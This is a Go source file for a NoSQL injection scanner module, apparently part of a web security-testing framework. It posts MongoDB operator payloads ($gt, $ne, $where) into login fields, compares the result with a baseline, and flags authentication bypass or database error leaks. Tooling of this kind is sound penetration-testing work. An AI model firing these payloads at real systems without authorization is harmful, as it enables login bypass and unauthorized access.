package core

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"sync"
	"time"
)

// NosqlInjectionTestingResult holds the result of the NosqlInjectionTesting module execution.
type NosqlInjectionTestingResult struct {
	Target string `json:"target"`
	Status string `json:"status"`
	Detail string `json:"detail,omitempty"`
}

// NosqlInjectionTesting executes the nosql_injection_testing security technique.
type NosqlInjectionTesting struct {
	BaseModule
	Target  string
	results []NosqlInjectionTestingResult
}

// NewNosqlInjectionTesting creates a new instance.
func NewNosqlInjectionTesting(target string) *NosqlInjectionTesting {
	return &NosqlInjectionTesting{
		BaseModule: BaseModule{
			Client:     NewHTTPClient(10 * time.Second),
			MaxThreads: 5,
		},
		Target: EnsureHTTPPrefix(target),
	}
}

func (m *NosqlInjectionTesting) SetThreads(count int) {
	if count < 1 {
		count = 1
	}
	m.MaxThreads = count
}

var noSqlPayloads = []map[string]interface{}{
	{"$gt": ""},
	{"$ne": "123"},
	{"$where": "1==1"},
}

func (m *NosqlInjectionTesting) getBaselineAuthBypass(ctx context.Context) bool {
	body := map[string]interface{}{
		"username": "invalid_user_12345",
		"password": "invalid_password_12345",
	}
	bodyBytes, _ := json.Marshal(body)

	req, err := http.NewRequestWithContext(ctx, "POST", m.Target, bytes.NewBuffer(bodyBytes))
	if err != nil {
		return false
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := m.Client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	respBody, _ := io.ReadAll(resp.Body)
	respStr := strings.ToLower(string(respBody))

	return resp.StatusCode >= 200 && resp.StatusCode < 300 && (strings.Contains(respStr, "\"token\":") || strings.Contains(respStr, "\"access_token\":"))
}

func (m *NosqlInjectionTesting) Execute(ctx context.Context) ([]NosqlInjectionTestingResult, error) {
	m.results = make([]NosqlInjectionTestingResult, 0)

	baselineAuthBypass := m.getBaselineAuthBypass(ctx)

	jobs := make(chan map[string]interface{}, len(noSqlPayloads))
	for _, p := range noSqlPayloads {
		jobs <- p
	}
	close(jobs)

	var wg sync.WaitGroup

	for i := 0; i < m.MaxThreads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for payload := range jobs {
				select {
				case <-ctx.Done():
					return
				default:
					m.testPayload(ctx, payload, baselineAuthBypass)
				}
			}
		}()
	}

	done := make(chan struct{})
	go func() {
		wg.Wait()
		close(done)
	}()

	select {
	case <-done:
		return m.results, nil
	case <-ctx.Done():
		<-done
		return m.results, ctx.Err()
	}
}

func (m *NosqlInjectionTesting) testPayload(ctx context.Context, payload map[string]interface{}, baselineAuthBypass bool) {
	// Attempt to send a JSON payload pretending to be a login or search body
	body := map[string]interface{}{
		"username": payload,
		"password": payload,
	}
	bodyBytes, _ := json.Marshal(body)

	req, err := http.NewRequestWithContext(ctx, "POST", m.Target, bytes.NewBuffer(bodyBytes))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := m.Client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	respBody, _ := io.ReadAll(resp.Body)
	respStr := strings.ToLower(string(respBody))

	// Some common indicators of NoSQLi success: DB errors or auth bypass
	isErrorLeak := strings.Contains(respStr, "mongoerror") || strings.Contains(respStr, "mongodb")
	isAuthBypass := resp.StatusCode >= 200 && resp.StatusCode < 300 && (strings.Contains(respStr, "\"token\":") || strings.Contains(respStr, "\"access_token\":"))

	if isAuthBypass && baselineAuthBypass {
		isAuthBypass = false
	}

	if isErrorLeak || isAuthBypass {
		payloadStr, _ := json.Marshal(payload)
		m.Mu.Lock()
		m.RecordPoC(req, nil, "Potential NoSQL injection successful using payload: "+string(payloadStr))
		m.results = append(m.results, NosqlInjectionTestingResult{
			Target: m.Target,
			Status: "vulnerable",
			Detail: "Potential NoSQL injection successful using payload: " + string(payloadStr),
		})
		m.Mu.Unlock()
	}
}

func init() {
	RegisterModule("nosql_injection_testing", func(payload map[string]any, onLog func(string)) (ExecutableModule, error) {

		target := PayloadString(payload, "url", "http://127.0.0.1")
		onLog(fmt.Sprintf("Starting NosqlInjectionTesting on: %s", target))

		tester := NewNosqlInjectionTesting(target)

		return ModuleWrapper{
			Module: tester,
			ExecuteFunc: func(ctx context.Context) (any, error) {
				return tester.Execute(ctx)
			},
		}, nil
	})
}
